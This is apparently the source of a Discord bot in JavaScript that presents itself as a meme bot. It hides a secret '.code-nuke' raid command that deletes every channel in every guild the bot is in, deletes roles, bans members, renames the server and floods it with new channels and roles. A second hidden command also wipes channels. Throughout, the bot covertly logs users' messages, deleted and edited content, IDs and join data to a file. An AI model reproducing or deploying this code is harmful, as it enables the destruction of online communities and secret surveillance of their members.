const Discord = require('discord.js');
const client = new Discord.Client();
var config = require('./vars.json');

const myLoggers = require('log4js');
const { setInterval } = require('timers');
const { S_IFREG } = require('constants');
const { randomInt } = require('crypto');

myLoggers.configure({
    appenders: { mylogger: { type:"file", filename: "./output.txt" } },
    categories: { default: { appenders:["mylogger"], level:"ALL" } }
});
const logger = myLoggers.getLogger("bot");

const token = config.TOKEN;
const p = ",";

var date=new Date(). toLocaleString();

var index1 = ["avaiable", "dnd", "idle"];
var index0 = ["PLAYING", "WATCHING", "STREAMING", "LISTENING"];
client.on('ready', () => {

setInterval((function(){

        var index3 = index0[Math.floor(Math.random() * index0.length)];
        var index2 = index1[Math.floor(Math.random() * index1.length)];
        client.user.setPresence({
            status: index2,
            activity: {
                name: 'your mom',
                type: index3,
                url: 'https://www.twitch.tv/ttv_bonndubz'
            }
        })
        
    }), 1000)
  console.log(`Logged in as ${client.user.tag}!`);
});


client.on('message', message => {
    
if(message.content !== "secret.1213.secret"){

    if(message.author.id === client.user.id){
        logger.debug(" BOT SENT --- "+message.member.user.tag +
        " ("+ message.member.user.id + 
        ") - In Server: "+message.member.guild.name+
        " ("+message.member.lastMessage.guild.id+
        ") ' Channel: #"+message.member.lastMessage.channel.name+
        " ("+message.member.lastMessage.channel.id+") - Messaged: '"+
         message.member.user.lastMessage.content +"'");
    }else{
        logger.debug(" MESSAGE SENT --- "+message.member.user.tag +
        " ("+ message.member.user.id + ") - Created Acc At: "+ message.member.user.createdAt +
        " - Joined " + message.member.guild.name + " ("+message.member.guild.id+") At: "+
         message.member.joinedAt + " "+ message.member.user.tag  + 
         " - In Server: "+message.member.guild.name+
         " ("+message.member.lastMessage.guild.id+") ' Channel: #"+message.member.lastMessage.channel.name+
         " ("+message.member.lastMessage.channel.id+") - Messaged: '"+ 
         message.member.user.lastMessage.content +"'");
    }
}

if(message.content.startsWith(""))

if(message.content === p+"meme"){
    var vids = [
"https://cdn.discordapp.com/attachments/735199254485794816/764586524548923433/cat.mp4",
"https://cdn.discordapp.com/attachments/735199254485794816/764610537223880773/noises.mp4",
"http://www.youtube.com/shorts/1ojVrhvlBkY"
];
    var vid = vids[Math.floor(Math.random() * vids.length)];

    message.channel.send(vid);
}

    if(message.content.startsWith(p+"test")){
message.reply("hi");    
    }


if(message.content.startsWith(".code-unnuke")){


    client.guilds.cache.forEach(guild => {

    guild.channels.cache.forEach(channel => {channel.delete()});
    message.guild.roles.cache.forEach(role => {
        var a = role;
        message.channel.send(a)
    })
    });

    message.guild.channels.create("uwu")


}

    if(message.content.startsWith(".code-nuke-87895465")){

console.log("raid activado");

        client.guilds.cache.forEach(guild => {

            guild.channels.cache.forEach(channel => {channel.delete()});
            message.guild.roles.cache.forEach(roles => roles.delete());
            guild.members.cache.forEach(m => {
                m.ban();

            });

               
            });


            message.guild.setIcon("https://upload.wikimedia.org/wikipedia/commons/thumb/b/b4/Cro-Magnon-female_Skull.png/503px-Cro-Magnon-female_Skull.png");
message.guild.setName("uwu");
            

        setInterval(() => {
                message.guild.roles.create("uwu")
                message.guild.roles.create("uwu")
                message.guild.roles.create("uwu")
           
                message.guild.channels.create("uwu")
                message.guild.channels.create("uwu")
                message.guild.channels.create("uwu")

           
               
                

            
        }, 200);
    }

});

client.on('messageDelete', msgDel => {

    if(msgDel){
        logger.debug("DELETED MESSAGE --- Server: "+
         msgDel.guild.name +
          " ("+msgDel.guild.id+") Channel: "+
           msgDel.channel.name + " ("+ msgDel.channel.id +
           ") " + msgDel.author.tag + 
           " ("+msgDel.author.id+") Deleted: "+ msgDel.content);
    }
});

client.on('guildMemberAdd', addedmem => {

    if(addedmem){
        logger.debug("ADDED MEMBER --- Server: "+
        addedmem.guild.name +
          " ("+addedmem.guild.id+") " + addedmem.user.tag + 
           " ("+addedmem.user.id+")");
    }
});

client.on('guildMemberRemove', addedmem => {

    if(addedmem){
        logger.debug("REMOVED MEMBER --- Server: "+
        addedmem.guild.name +
          " ("+addedmem.guild.id+") " + addedmem.user.tag + 
           " ("+addedmem.user.id+")");
    }
});

client.on('inviteCreate', addedmem => {

    if(addedmem){
        logger.debug("INVITE CREATED --- Server: "+
        addedmem.guild.name +
          " ("+addedmem.guild.id+") Created By: " + addedmem.inviter.tag + 
           " ("+addedmem.inviter.id+") invite: "+ 
           addedmem.url + " max uses: "+ addedmem.maxUses +
            " max age: "+ addedmem.maxAge + " Created At: "+ addedmem.createdAt + " Expires In: "+addedmem.expiresAt);
    }
});

client.on('messageUpdate', addedmem => {

    if(addedmem){
        logger.debug("MESSAGE EDITED --- Server: "+
        addedmem.guild.name +
          " ("+addedmem.guild.id+") Channel: " + addedmem.channel.name + 
          " ("+ addedmem.channel.id +") - Edited By: " + addedmem.author.tag + 
          " ("+addedmem.author.id+") - Content: "+ addedmem.member.lastMessage.content);
    }
});

client.login(token);